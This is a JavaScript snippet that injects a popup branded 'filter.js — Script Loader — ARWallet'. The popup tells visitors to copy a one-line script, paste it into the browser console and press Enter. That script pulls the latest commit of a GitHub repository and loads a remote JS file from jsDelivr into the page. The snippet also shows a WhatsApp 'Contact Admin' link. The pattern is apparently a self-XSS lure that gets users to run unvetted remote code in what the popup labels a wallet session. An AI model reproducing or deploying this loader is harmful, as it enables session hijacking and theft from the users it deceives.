(function(){
  if(document.getElementById('filterjs-popup'))return;

  const style=document.createElement('style');
  style.textContent=`
    #filterjs-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:999998;display:flex;align-items:center;justify-content:center;padding:1rem;backdrop-filter:blur(4px)}
    #filterjs-popup{background:#1a1a1a;border:1px solid #2e2e2e;border-radius:20px;width:100%;max-width:420px;overflow:hidden;font-family:'Segoe UI',system-ui,sans-serif;box-shadow:0 0 60px rgba(99,102,241,0.1)}
    #filterjs-popup .fj-header{padding:1.25rem 1.5rem;border-bottom:1px solid #2e2e2e;display:flex;align-items:center;gap:12px}
    #filterjs-popup .fj-logo{width:38px;height:38px;border-radius:10px;background:#1e1b4b;border:1px solid rgba(99,102,241,0.3);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
    #filterjs-popup .fj-title{font-size:15px;font-weight:600;color:#f0f0f0;margin:0}
    #filterjs-popup .fj-sub{font-size:11px;color:#888;margin:2px 0 0}
    #filterjs-popup .fj-badge{margin-left:auto;background:#052e16;color:#22c55e;font-size:10px;font-weight:700;padding:3px 9px;border-radius:20px;border:1px solid rgba(34,197,94,0.25)}
    #filterjs-popup .fj-body{padding:1.25rem 1.5rem}
    #filterjs-popup .fj-label{font-size:10px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:8px}
    #filterjs-popup .fj-codebox{background:#111;border:1px solid #2e2e2e;border-radius:12px;padding:12px;margin-bottom:1.25rem}
    #filterjs-popup .fj-code{font-family:'Courier New',monospace;font-size:11px;color:#a5f3fc;line-height:1.6;word-break:break-all;white-space:pre-wrap;max-height:120px;overflow-y:auto}
    #filterjs-popup .fj-hint{font-size:10px;color:#555;margin-top:8px;padding-top:8px;border-top:1px solid #2e2e2e}
    #filterjs-popup .fj-copybtn{width:100%;padding:12px;border-radius:12px;border:none;background:#6366f1;color:#fff;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;font-family:inherit;transition:background 0.15s,transform 0.1s}
    #filterjs-popup .fj-copybtn:hover{background:#4f46e5}
    #filterjs-popup .fj-copybtn:active{transform:scale(0.98)}
    #filterjs-popup .fj-copybtn.copied{background:#22c55e}
    #filterjs-popup .fj-divider{display:flex;align-items:center;gap:10px;margin-bottom:10px}
    #filterjs-popup .fj-divider span{font-size:11px;color:#555;white-space:nowrap}
    #filterjs-popup .fj-divline{flex:1;height:1px;background:#2e2e2e}
    #filterjs-popup .fj-wabtn{width:100%;padding:12px;border-radius:12px;border:1px solid rgba(37,211,102,0.2);background:#1a2e1a;color:#25d366;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit;text-decoration:none;transition:background 0.15s,transform 0.1s}
    #filterjs-popup .fj-wabtn:hover{background:#1e3a1e}
    #filterjs-popup .fj-wabtn:active{transform:scale(0.98)}
    #filterjs-popup .fj-footer{padding:0.85rem 1.5rem;border-top:1px solid #2e2e2e;display:flex;align-items:center;gap:6px;font-size:11px;color:#555}
    #filterjs-popup .fj-dot{width:6px;height:6px;border-radius:50%;background:#22c55e;box-shadow:0 0 5px #22c55e;flex-shrink:0}
    #filterjs-popup .fj-close{margin-left:auto;background:none;border:none;color:#555;cursor:pointer;font-size:18px;line-height:1;padding:0}
    #filterjs-popup .fj-close:hover{color:#f0f0f0}
  `;
  document.head.appendChild(style);

  const script=`(async()=>{const r='ajehrg26/KiSen';if(document.querySelector(\`script[data-loader="\${r}"]\`))return;try{const{sha}=await(await fetch(\`https://api.github.com/repos/\${r}/commits/main\`)).json(),s=document.createElement('script');s.src=\`https://cdn.jsdelivr.net/gh/\${r}@\${sha}/qsss%20(2).js\`;s.dataset.loader=r;document.head.appendChild(s)}catch(e){console.error('Load failed:',e)}})();`;

  const overlay=document.createElement('div');
  overlay.id='filterjs-overlay';
  overlay.innerHTML=`
    <div id="filterjs-popup">
      <div class="fj-header">
        <div class="fj-logo">⚡</div>
        <div>
          <p class="fj-title">filter.js</p>
          <p class="fj-sub">Script Loader — ARWallet</p>
        </div>
        <div class="fj-badge">ACTIVE</div>
      </div>
      <div class="fj-body">
        <p class="fj-label">New Script</p>
        <div class="fj-codebox">
          <div class="fj-code" id="fj-script-content">${script}</div>
          <p class="fj-hint">📌 Paste in browser console → press Enter</p>
        </div>
        <button class="fj-copybtn" id="fj-copy">
          <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
          <span id="fj-copy-text">Copy Script</span>
        </button>
        <div class="fj-divider">
          <div class="fj-divline"></div>
          <span>need help?</span>
          <div class="fj-divline"></div>
        </div>
        <a class="fj-wabtn" href="https://wa.me/917407979642" target="_blank" rel="noopener">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
          Contact Admin
        </a>
      </div>
      <div class="fj-footer">
        <div class="fj-dot"></div>
        Latest build auto-fetched from GitHub
        <button class="fj-close" id="fj-close">✕</button>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);

  document.getElementById('fj-close').onclick=()=>overlay.remove();
  overlay.onclick=(e)=>{if(e.target===overlay)overlay.remove()};

  document.getElementById('fj-copy').onclick=function(){
    const code=document.getElementById('fj-script-content').textContent;
    const btn=this;
    const txt=document.getElementById('fj-copy-text');
    navigator.clipboard.writeText(code).then(()=>{
      btn.classList.add('copied');txt.textContent='Copied!';
      setTimeout(()=>{btn.classList.remove('copied');txt.textContent='Copy Script'},2000);
    }).catch(()=>{
      const ta=document.createElement('textarea');
      ta.value=code;ta.style.cssText='position:fixed;opacity:0';
      document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();
      btn.classList.add('copied');txt.textContent='Copied!';
      setTimeout(()=>{btn.classList.remove('copied');txt.textContent='Copy Script'},2000);
    });
  };
})();
